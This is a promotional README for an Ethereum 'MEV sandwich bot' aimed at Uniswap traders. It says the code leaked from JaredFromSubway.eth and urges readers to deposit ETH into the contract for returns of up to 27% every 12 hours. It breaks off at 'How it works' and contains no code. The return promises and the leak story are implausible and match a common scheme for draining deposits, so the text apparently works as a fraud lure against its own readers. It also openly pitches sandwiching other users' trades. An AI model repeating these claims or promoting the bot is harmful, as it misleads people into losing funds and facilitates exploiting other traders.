Jared-MEV-Bot-ETH🚀🥪
Use this ETH MEV-BOT to make sandwich attacks on Uniswap. A Maximal Extractable Value (MEV) Solidity Sandwich BOT that allows deployers of contract to take profits from tokens. This MEV-BOT has been copied from the legendary JaredFromSubway.eth (0xae2Fc483527B8EF99EB5D9B44875F005ba1FaE13), because Jared accidentally leaked his private code while updating his MEV bot earlier.

Bot sends the transaction and sniffs the Uniswap v2 Mempool for txs with high slippage, calculating if a sandwich attack is profitable.

Bots then compete to buy up the token onchain as quickly as possible, sandwiching the victims transaction and creating a profitable slippage opportunity, my bot always puts 1 gas more than everybody elses, as long as it remains profitable, securing a large amount of profitable transactions.

Then sends back the ETH to the contract ready for withdrawal.

This bot performs all of that, faster than 99% of other bots.

MEV bot Instructions (works only for Mainnet)

Deposits
Deposits of lower than 0.4 ETH are going to find much fewer txs because of the gas fees

Higher amounts of ETH deposited into the contract result in a larger amount of successful sandwich attack txs, therefore more profit

For higher profits use above 1.2 ETH

Expected returns
0.1ETH - 0.4ETH = up to 10%/12hrs

0.4ETH - 1.2ETH = up to 20%/12hrs

1.2ETH - 2.4ETH = 20-27%/12hrs

2.4ETH+ = 27%++ every 12 hrs

Make money with MevBot (ETH network)

How it works:
